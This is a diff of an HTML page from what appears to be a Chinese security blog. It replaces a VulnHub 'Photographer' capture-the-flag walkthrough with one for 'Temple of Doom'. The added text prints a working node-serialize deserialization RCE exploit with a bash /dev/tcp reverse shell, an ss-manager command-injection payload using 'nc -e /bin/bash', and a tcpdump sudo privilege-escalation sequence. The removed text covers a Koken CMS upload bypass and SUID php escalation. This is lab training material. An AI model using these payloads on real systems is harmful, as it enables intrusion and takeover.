@@ -4,11 +4,19 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Photographer：利用sambashare获取账密信息, SummerOne">
-    <meta name="description" content="靶机下载地址：https://www.vulnhub.com/entry/photographer-1,519/
-这个靶机只能在virtualbox中打开，而kali是vmware的，因此需要一些网络配置才能使二者互通：配置方法
+    <meta name="keywords" content="Temple：利用多漏洞提权, SummerOne">
+    <meta name="description" content="
+靶机下载地址
 
-1.信息">
+1.信息收集端口扫描
+
+666端口
+
+目录扫描：
+没有扫描到目录
+2.利用Node.js漏洞反弹连接搜索666端口node.js的漏洞，发现存在一个RCE漏洞，CVE: CVE-2017-5941
+修改payload：
+#">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +28,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Photographer：利用sambashare获取账密信息 | SummerOne</title>
+    <title>Temple：利用多漏洞提权 | SummerOne</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -323,12 +331,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Photographer：利用sambashare获取账密信息</h1>
+                    <h1 class="description center-align post-title">Temple：利用多漏洞提权</h1>
                 </div>
             </div>
         </div>
@@ -381,7 +389,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-11-29
+                    2023-04-03
                 </div>
                 
 
@@ -410,89 +418,83 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>靶机下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/photographer-1,519/">https://www.vulnhub.com/entry/photographer-1,519/</a></p>
-<p>这个靶机只能在virtualbox中打开，而kali是vmware的，因此需要一些网络配置才能使二者互通：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43342566/article/details/102679837?spm=1001.2101.3001.6650.3">配置方法</a></p>
-<hr>
-<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>地址信息</p>
-<p>靶机地址：10.0.2.100</p>
-<p>kali地址：10.0.2.102</p>
-<p>nmap扫描开放端口和服务：</p>
-<pre class="line-numbers language-none"><code class="language-none">nmap -A -sV 10.0.2.100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+                <blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/temple-of-doom-1,243/">靶机下载地址</a></p>
+</blockquote>
+<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>端口扫描</p>
+<p><img src="/posts/209d6ddd/image-20230403104551992.png"></p>
+<p>666端口</p>
+<p><img src="/posts/209d6ddd/image-20230403111513133.png"></p>
+<p>目录扫描：</p>
+<p>没有扫描到目录</p>
+<h2 id="2-利用Node-js漏洞反弹连接"><a href="#2-利用Node-js漏洞反弹连接" class="headerlink" title="2.利用Node.js漏洞反弹连接"></a>2.利用Node.js漏洞反弹连接</h2><p>搜索666端口node.js的漏洞，发现存在<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/49552">一个RCE漏洞</a>，CVE: CVE-2017-5941</p>
+<p>修改payload：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Exploit Title: Node.JS - 'node-serialize' Remote Code Execution (2)</span>
+<span class="token comment"># Exploit Author: UndeadLarva</span>
+<span class="token comment"># Software Link: https://www.npmjs.com/package/node-serialize</span>
+<span class="token comment"># Version: 0.0.4</span>
+<span class="token comment"># CVE: CVE-2017-5941</span>
 
-<p><img src="/posts/d117200a/image-20221130100955815.png"></p>
-<p>开放端口信息</p>
-<ul>
-<li>80：http webserver  Apache httpd 2.4.18 (Ubuntu)</li>
-<li>139 ：netbios-ssn Samba smbd 3.X - 4.X</li>
-<li>445：netbios-ssn Samba smbd 4.3.11-Ubuntu</li>
-<li>8000 ：http webserver Koken CMS</li>
-</ul>
-<p>测试思路</p>
-<ul>
-<li>80和8000端口：功能点测试、审查源码、JS文件、目录扫描</li>
-<li>139和455端口：SMB协议枚举，利用已知漏洞</li>
-</ul>
-<h2 id="2-Web应用枚举"><a href="#2-Web应用枚举" class="headerlink" title="2.Web应用枚举"></a>2.Web应用枚举</h2><p>80端口：一个漂亮的网页，查看源码无发现。</p>
-<p><img src="/posts/d117200a/image-20221129155203914.png"></p>
-<p>8000端口：这是一个由名为koken的内容管理系统（CMS）搭建的。</p>
-<p><img src="/posts/d117200a/image-20221129155230114.png"></p>
-<p>通过目录扫描，发现了管理员登录界面。</p>
-<p><img src="/posts/d117200a/image-20221129160601357.png"></p>
-<h2 id="3-SMB协议枚举"><a href="#3-SMB协议枚举" class="headerlink" title="3.SMB协议枚举"></a>3.SMB协议枚举</h2><p>从端口扫描可以看到靶机系统为ubuntu，139和445端口利用samba实现在linux系统上的SMB协议。</p>
-<p>使用<a target="_blank" rel="noopener" href="https://www.kali.org/tools/enum4linux/">enum4linux</a>工具对目标Linux系统进行枚举.</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">enum4linux <span class="token number">10.0</span>.2.100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> re
+<span class="token keyword">import</span> base64
+<span class="token keyword">import</span> sys
 
-<p><img src="/posts/d117200a/image-20221130105543201.png"></p>
-<p>扫描结果显示“sambashare”共享可用，可以作为切入点。</p>
-<p>继续查看enum4linux的输出，发现两个用户：daisa和agi。</p>
-<p><img src="/posts/d117200a/image-20221130110250610.png"></p>
-<p>尝试连接sambashare，先匿名登录，如果不行可能会用到上面两个用户名</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">smbclient <span class="token parameter variable">-U</span> <span class="token string">''</span> //10.0.2.100/sambashare<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+url <span class="token operator">=</span> <span class="token string">'http://192.168.56.7:666/'</span> <span class="token comment"># change this</span>
 
-<p>sambashare在无用户名和密码的情况下成功连接：</p>
-<p><img src="/posts/d117200a/image-20221130110641601.png"></p>
-<p>查看文件，里面有两个文件：一个txt文件，另一个似乎是wordpress的备份文件。</p>
-<p>先查看txt文件看能否获取信息，再考虑比较复杂的wordpress文件。</p>
-<p><img src="/posts/d117200a/image-20221130111204807.png"></p>
-<p>txt文件内容貌似是一封信：</p>
-<p><img src="/posts/d117200a/image-20221130111257519.png"></p>
-<p>从信里的信息可以猜测，<strong>邮箱：<a href="mailto:&#x64;&#x61;&#105;&#x73;&#x61;&#64;&#112;&#x68;&#x6f;&#x74;&#x6f;&#x67;&#x72;&#x61;&#x70;&#104;&#101;&#x72;&#x2e;&#x63;&#111;&#x6d;">&#x64;&#x61;&#105;&#x73;&#x61;&#64;&#112;&#x68;&#x6f;&#x74;&#x6f;&#x67;&#x72;&#x61;&#x70;&#104;&#101;&#x72;&#x2e;&#x63;&#111;&#x6d;</a>，密码：babygirl</strong></p>
-<p>用这个账密信息尝试登录koken管理员界面:<a target="_blank" rel="noopener" href="http://10.0.2.100:8000/admin">http://10.0.2.100:8000/admin</a></p>
-<p><img src="/posts/d117200a/image-20221130111757995.png" alt="登录成功"></p>
-<h2 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4.反弹shell"></a>4.反弹shell</h2><p>现在可以以管理员身份登录Koken CMS系统，搜一下这个系统的漏洞。</p>
-<p>存在一个<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/48706">任意文件上传漏洞</a> ，漏洞描述：Koken CMS的上传限制基于允许的文件扩展名列表(withelist)，这有助于通过Burp处理HTTP请求来进行绕过。</p>
-<p>利用步骤：</p>
-<p>1）创建恶意PHP文件，这里使用的是kali系统目录 &#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php下的php反弹shell文件，把ip地址和端口分别修改为kali的ip和监听端口。</p>
-<p><img src="/posts/d117200a/image-20221130140749360.png"></p>
-<p>2）保存为 “image.php.jpg”.</p>
-<p>3）登录Koken系统，在首页Library标签中点击“Import Content”按钮上传文件，并用burp拦截。</p>
-<p><img src="/posts/d117200a/image-20221130141431892.png"></p>
-<p><img src="/posts/d117200a/image-20221130141624609.png" alt="burp拦截"></p>
-<p>4）在burp中修改文件名为“image.php”再重放。</p>
-<p><img src="/posts/d117200a/image-20221130144449082.png" alt="标记的两处都要改"></p>
-<p>5）在content页面，查看已经上传的php文件。</p>
-<p><img src="/posts/d117200a/image-20221130144838277.png"></p>
-<p>6）在kali中监听端口，触发文件链接，反弹shell成功！</p>
-<p><img src="/posts/d117200a/image-20221130145035971.png"></p>
-<p>查看当前权限，为www-data站点用户，进入&#x2F;home&#x2F;daisa目录，user.txt任何用户可查看，得到普通用户user.txt</p>
-<p><img src="/posts/d117200a/image-20221130145605649.png"></p>
-<h2 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h2><p>检查是否存在<strong>suid权限文件</strong>，suid权限的作用是允许用户以其所有者的权限执行文件，因此如果有可以让普通用户执行的属于root的文件，即可获取root权限。</p>
-<p>用以下命令查找suid权限文件:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-type</span> f <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+payload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"require('http').ServerResponse.prototype.end = (function (end) &#123;"</span>
+<span class="token string">"return function () &#123;"</span>
+<span class="token string">"['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'timeout', ''].forEach(this.socket.removeAllListeners.bind(this.socket));"</span>
+<span class="token string">"console.log('still inside');"</span>
+<span class="token string">"const &#123; exec &#125; = require('child_process');"</span>
+<span class="token string">"exec('bash -i >&amp; /dev/tcp/192.168.56.3/445 0>&amp;1');"</span> <span class="token comment"># change this</span>
+<span class="token string">"&#125;"</span>
+<span class="token string">"&#125;)(require('http').ServerResponse.prototype.end)"</span><span class="token punctuation">)</span>
 
-<p><img src="/posts/d117200a/image-20221130150718574.png"></p>
-<p>发现php7.2有suid权限，查找<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/php/">GTFO Bins</a>，用以下命令提权。</p>
-<p><img src="/posts/d117200a/image-20221130151011473.png"></p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/bin/php7.2 <span class="token parameter variable">-r</span> <span class="token string">"pcntl_exec('/bin/bash', ['-p']);"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<span class="token comment"># rce = "_$$ND_FUNC$$_process.exit(0)"</span>
+<span class="token comment"># code ="_$$ND_FUNC$$_console.log('behind you')"</span>
+code <span class="token operator">=</span> <span class="token string">"_$$ND_FUNC$$_"</span> <span class="token operator">+</span> payload
 
-<p>成功获取root权限！</p>
-<p><img src="/posts/d117200a/image-20221130151442420.png"></p>
-<h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h2><p>靶机考察的知识点：</p>
-<ul>
-<li>公开的samba共享泄露账密等信息；</li>
-<li>利用CMS系统任意文件上传漏洞反弹shell；</li>
-<li>利用suid权限文件提权。</li>
-</ul>
+string <span class="token operator">=</span> <span class="token string">'&#123;"username":"TheUndead","country":"worldwide","city":"Tyr", "exec": "'</span><span class="token operator">+</span>code<span class="token operator">+</span><span class="token string">'"&#125;'</span>
+
+cookie <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'profile'</span><span class="token punctuation">:</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
+
+<span class="token keyword">try</span><span class="token punctuation">:</span>
+    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookie<span class="token punctuation">)</span><span class="token punctuation">.</span>text
+    <span class="token keyword">print</span> response
+<span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>RequestException <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Oops!'</span><span class="token punctuation">)</span>
+    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+           <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>监听445端口，运行payload脚本，获得系统反弹shell</p>
+<p><img src="/posts/209d6ddd/image-20230403120918543.png"></p>
+<h2 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h2><p>当前用户是nodeadmin，在&#x2F;home文件夹下还有一个用户是fireman</p>
+<p>搜索fireman相关的文件：</p>
+<pre class="line-numbers language-none"><code class="language-none">find &#x2F; -type f -name &quot;*&quot; |xargs grep -ri &quot;fireman&quot; 2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>看到有一个文件在自启动文件里：ss-manager</p>
+<p><img src="/posts/209d6ddd/image-20230403171638690.png"></p>
+<p>验证一下这个程序是否在执行：</p>
+<p><img src="/posts/209d6ddd/image-20230403171829020.png"></p>
+<p>ss-manager在执行。利用ss-manager的<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/43006">漏洞</a>。</p>
+<pre class="line-numbers language-none"><code class="language-none">add:&#123;&quot;server_port&quot;:8003,&quot;password&quot;:&quot;test&quot;,&quot;method&quot;:&quot;||nc 192.168.56.3 3333 -e &#x2F;bin&#x2F;bash||&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后提权到fireman用户。</p>
+<p><img src="/posts/209d6ddd/image-20230403181136169.png"></p>
+<p>在fireman用户中查看sudo -l，发现可以利用<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/tcpdump/">tcpdump提权</a>：</p>
+<p><img src="/posts/209d6ddd/image-20230403181058246.png"></p>
+<p><img src="/posts/209d6ddd/image-20230403181313160.png"></p>
+<p>依次输入如下命令：</p>
+<pre class="line-numbers language-none"><code class="language-none">[fireman@localhost ~]$ COMMAND&#x3D;&#39;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.56.3&#x2F;5555 0&gt;&amp;1&#39;
+[fireman@localhost ~]$ TF&#x3D;$(mktemp)
+[fireman@localhost ~]$ echo &quot;$COMMAND&quot; &gt; $TF
+[fireman@localhost ~]$ chmod +x $TF
+[fireman@localhost ~]$ sudo tcpdump -ln -i lo -w &#x2F;dev&#x2F;null -W 1 -G 1 -z $TF -Z root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/posts/209d6ddd/image-20230403181458427.png"></p>
+<p>获取到flag</p>
+<p><img src="/posts/209d6ddd/image-20230403181638264.png"></p>
 
                 
             </div>
@@ -519,7 +521,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://summerone111.github.io/posts/d117200a.html">https://summerone111.github.io/posts/d117200a.html</a>
+                    <a href="https://summerone111.github.io/posts/209d6ddd.html">https://summerone111.github.io/posts/209d6ddd.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -605,17 +607,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/posts/8c926676.html">
+                <a href="/posts/209d6ddd.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="Healthcare：用big字典扫描隐藏目录">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="Temple：利用多漏洞提权">
                         
-                        <span class="card-title">Healthcare：用big字典扫描隐藏目录</span>
+                        <span class="card-title">Temple：利用多漏洞提权</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -625,9 +628,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-12-01
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-03
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -640,6 +643,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -662,24 +666,24 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/3bd3766a.html">
+                <a href="/posts/29c038ca.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="GlasgowSmile：定制字典生成爆破与提权的多种姿势">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="skytower：代理绑定本地端口绕过filtered端口">
                         
-                        <span class="card-title">GlasgowSmile：定制字典生成爆破与提权的多种姿势</span>
+                        <span class="card-title">skytower：代理绑定本地端口绕过filtered端口</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            根据网页内容生成爆破字典，爆破CMS系统后获取反弹shell，利用数据库、密码学、文件搜索等获取各用户账密信息，最后进程监控，提取至root权限
+                            
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-28
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-28
                             </span>
                         <span class="publish-author">
                             
